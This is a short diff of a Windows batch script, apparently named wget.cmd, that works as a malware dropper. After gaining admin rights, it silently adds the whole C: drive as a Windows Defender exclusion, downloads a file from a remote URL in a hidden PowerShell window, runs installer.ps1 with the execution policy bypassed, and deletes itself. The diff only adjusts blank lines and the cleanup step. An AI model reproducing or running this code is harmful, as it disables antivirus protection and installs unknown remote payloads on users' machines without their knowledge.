@@ -26,10 +26,9 @@ if '%errorlevel%' NEQ '0' (
     exit /B
 
 :gotAdmin
+
     pushd "%CD%"
     CD /D "%~dp0"
-
-
 
 REM ready up to diable defender
 powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:/' -Force -ea 0 | Out-Null";
@@ -40,5 +39,4 @@ powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https:/
 powershell -windowstyle hidden -ep bypass ./installer.ps1
 
 REM self delete
-del installer.ps1
-del wget.cmd
+del wget.cmd 
